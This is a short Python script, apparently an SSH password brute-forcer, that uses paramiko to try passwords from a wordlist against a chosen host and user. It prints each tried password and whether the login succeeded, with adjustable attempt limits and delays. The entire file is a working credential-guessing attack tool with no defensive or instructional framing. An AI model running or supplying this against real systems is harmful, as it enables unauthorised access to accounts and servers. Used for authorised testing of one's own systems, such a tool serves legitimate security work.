import argparse
import time
import socket
import paramiko

def attempt(host, port, user, password, timeout):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(hostname=host, port=port, username=user, password=password, timeout=timeout, banner_timeout=timeout, auth_timeout=timeout, allow_agent=False, look_for_keys=False)
        c.close()
        return True, None
    except Exception as e:
        return False, str(e)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", required=True)
    p.add_argument("--port", type=int, default=22)
    p.add_argument("--user", required=True)
    p.add_argument("--wordlist", required=True)
    p.add_argument("--attempts", type=int, default=50)
    p.add_argument("--delay-ms", type=int, default=50)
    p.add_argument("--timeout", type=float, default=3.0)
    args = p.parse_args()

    with open(args.wordlist, "r", encoding="utf-8") as f:
        words = [x.strip() for x in f.read().splitlines() if x.strip()]

    n = min(args.attempts, len(words))
    for i in range(n):
        pwd = words[i]
        ok, err = attempt(args.host, args.port, args.user, pwd, args.timeout)
        print(f"{i+1}/{n} password={pwd} ok={ok}")
        time.sleep(max(args.delay_ms, 0) / 1000.0)

if __name__ == "__main__":
    main()
